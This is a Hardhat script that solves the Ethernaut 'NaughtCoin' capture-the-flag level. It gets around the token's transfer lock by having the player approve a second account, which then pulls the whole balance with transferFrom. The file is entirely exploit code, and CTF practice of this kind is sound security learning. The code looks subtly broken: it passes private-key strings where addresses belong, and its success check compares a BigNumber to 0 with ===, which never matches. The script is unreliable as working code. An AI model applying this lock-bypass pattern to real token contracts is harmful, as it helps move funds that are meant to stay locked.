import { ethers } from "hardhat";

const approveNaughtCoin = async () => {
    // change naughtcoin instance address here
    const naughtCoinAddress = "0x3a7425BC6e24Be643cBa3e830C1356091a42Abd3";
    // change your player and spender address in the .env file
    const player = process.env.PRIVATE_KEY || "";
    const spender = process.env.PRIVATE_KEY_2 || "";
    // alternatively you can manually add addresses below:
    // const player = "0x3C4f1C7Ab126a94016CA8F4e770522810aa61954";
    // const spender = "0x5BDE7cAa4aF4C56A73a4bCBCC3760A76057dba4E";

    // Don't touch below 🚀
    // Vulnerability comes from an alternative way of transfering the token since it is an ERC20 compliant token.
    // Additional read to understand more:
    // https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md
    // https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol

    // 1st part using player
    const IERC20 = await ethers.getContractAt("IERC20", naughtCoinAddress);
    const IERC20Player = IERC20.connect(player);
    let playerBalance = await IERC20Player.balanceOf(player);
    let spenderBalance = await IERC20Player.balanceOf(spender);
    console.log(`Players Balance: ${playerBalance}`);
    console.log(`Spenders Balance: ${spenderBalance}`);
    console.log("Now approving Spender Address to spend Player's balance...");
    const tx = await IERC20Player.approve(spender, playerBalance);
    const success = await tx.wait(1);
    console.log(success);
    const amountApproved = (await IERC20Player.allowance(player, spender)).toString();
    console.log(`Amount approved for transfer: ${amountApproved}`);
    // 2nd part using spender
    console.log("Spender will now transfer the balance to itself...");
    const IERC20Spender = IERC20.connect(spender);
    const tx2 = await IERC20Spender.transferFrom(player, spender, playerBalance);
    const receipttx2 = await tx2.wait(1);
    console.log(receipttx2);
    console.log("Rechecking balances...");
    playerBalance = await IERC20Spender.balanceOf(player);
    spenderBalance = await IERC20Spender.balanceOf(spender);
    console.log(`Players Balance: ${playerBalance}`);
    console.log(`Spenders Balance: ${spenderBalance}`);
    if (playerBalance === 0) {
        console.log("Congrats! Player balance is now 0, submit to ethernaut");
    } else {
        console.log("Player balance is not 0, Please review code above and try again...");
    }
};

approveNaughtCoin()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
